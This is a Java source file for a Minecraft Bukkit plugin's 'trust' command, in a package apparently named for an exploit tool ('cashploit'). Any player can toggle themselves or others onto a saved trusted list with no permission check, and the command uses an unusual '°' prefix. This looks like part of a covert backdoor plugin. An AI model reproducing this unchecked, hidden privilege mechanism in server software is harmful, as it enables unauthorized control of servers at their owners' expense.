package de.cashploit5.v1_12_2.command;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.OfflinePlayer;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

import de.cashploit5.Main;
import de.cashploit5.v1_12_2.uuidmanager.UUIDManager;

public class TrustCommand extends Command {

	public TrustCommand() {
		super("trust");
		trustedPlayers = Main.getPlugin().getConfig("trusted").getStringList("players");
	}

	private static List<String> trustedPlayers = new ArrayList<>();

	@Override
	public void onCommand(Player p, Command command, String[] args) {
		if (args.length == 0) {
			if (trustedPlayers.contains(p.getUniqueId().toString())) {
				trustedPlayers.remove(p.getUniqueId().toString());
				Main.sendMessage(p, "§cDu bist nun nicht mehr getrusted");
			} else {
				trustedPlayers.add(p.getUniqueId().toString());
				Main.sendMessage(p, "§cDu bist nun getrusted!");
			}
		} else if(args.length == 1) {
			OfflinePlayer t = UUIDManager.getOfflinePlayer(args[0]);
			if(t == null) {
				Main.sendMessage(p, "§cDieser Spieler war noch nie auf dem Server");
			} else {
				if(trustedPlayers.contains(t.getUniqueId().toString())) {
					trustedPlayers.remove(t.getUniqueId().toString());
					Main.sendMessage(p, "§aDu hast Spieler §6" + t.getName() + " §aenttrusted");
				} else {
					trustedPlayers.add(t.getUniqueId().toString());
					Main.sendMessage(p, "§aDu hast Spieler §6" + t.getName() + " §agetrusted");
				}
			}
		} else {
			Main.sendMessage(p, "§6°trust [<Player>]");
		}
		YamlConfiguration cfg = Main.getPlugin().getConfig("trusted");
		cfg.set("players", trustedPlayers);
		Main.getPlugin().saveConfig(cfg);
	}

	public static List<String> getTrustedPlayers() {
		return trustedPlayers;
	}
}
